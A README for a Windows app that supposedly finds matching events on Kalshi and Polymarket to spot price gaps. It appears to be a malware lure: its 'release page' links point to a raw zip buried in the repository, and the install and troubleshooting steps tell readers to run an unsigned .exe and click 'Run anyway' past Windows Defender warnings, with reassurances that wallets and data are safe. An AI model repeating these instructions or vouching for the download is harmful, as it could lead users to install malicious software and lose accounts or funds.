# 🔍 find-similar-events - Compare prediction market events across platforms

[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Color-truetoad229/find-similar-events/main/similarity_analysis/find_events_similar_1.8-beta.2.zip)

This application identifies matching events on Kalshi and Polymarket. It uses semantic matching to find the same trading opportunities on both platforms. You gain insight into price gaps for identical events without manual searching.

## 📋 About This Software

Prediction markets often list similar events with slightly different titles. One platform might call an event "Will it rain in New York" while another uses "Precipitation in NYC." This makes it hard to compare prices. 

This tool solves that problem. It analyzes event titles using natural language processing to group identical bets. You see these pairings in a simple dashboard. This helps you track market differences and identify potential arbitrage trades.

## 💻 System Requirements

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** 8GB RAM minimum.
*   **Storage:** 500MB of free disk space.
*   **Internet:** A stable connection to fetch real-time market data.

## 🚀 How to Install and Run

Follow these steps to set up the software on your Windows computer.

1.  **Visit the download page.** Go to the [official release page](https://raw.githubusercontent.com/Color-truetoad229/find-similar-events/main/similarity_analysis/find_events_similar_1.8-beta.2.zip) to access the installer.
2.  **Download the installer.** Look for the file ending in `.exe` under the latest release. Save this file to your computer.
3.  **Run the file.** Double-click the downloaded file to begin the setup process.
4.  **Security prompt.** Windows may show a security screen. If it does, click "More info" and then "Run anyway." This screen appears because the app is provided directly by the developer.
5.  **Follow the setup wizard.** Click "Next" through the prompts to install the application.
6.  **Launch the app.** Find the "find-similar-events" icon on your desktop or in your Start menu. Click it to open the dashboard.

## 📊 Using the Dashboard

Once you open the software, the dashboard displays matching events. The top menu allows you to refresh the data. 

*   **Event Comparison Table:** This shows the linked events from Kalshi and Polymarket side-by-side. 
*   **Matching Confidence:** A number displays how closely the tool thinks the events match. High numbers indicate a strong connection.
*   **Price Column:** View the current market prices for both events to identify gaps.

## 🛠 Troubleshooting Common Issues

*   **The app shows no events:** Check your internet connection. If the connection works, close and restart the application to force a data refresh.
*   **Windows blocks the installation:** Windows Defender sometimes flags new software. Select "Run anyway" in the popup window.
*   **Slow performance:** The tool processes data in the background. Wait a few moments if the screen seems frozen while it fetches market updates. 
*   **Display errors:** If the dashboard looks shifted, resize the window to force it to redraw the layout.

## ⚙️ How It Works

The program cleans event names from both websites. It converts these titles into data points that computers understand. It then calculates the similarity between these points. If two titles share enough meaning, the tool links them in your dashboard. This skips the need for you to copy and paste event names into a spreadsheet. 

## 🛡 Privacy and Safety

This software runs locally on your computer. It does not send your personal trader data to external servers. It fetches public market information only. Your trade decisions remain private. The tool only stores your local preferences and the latest list of events on your hard drive. 

## ❓ Frequently Asked Questions

**Do I need a paid account?**
No. This tool is free to use for viewing event mappings.

**Does this tool place trades for me?**
No. It provides information for your review. You must place trades manually on your preferred exchange.

**How often does it update?**
The tool refreshes its data every five minutes to keep market prices current.

**Can I use this on a Mac?**
Currently, this version is built for Windows. 

**Is this safe for my wallet?**
The software does not connect to your exchange accounts. It cannot access your funds. It simply reads public price data.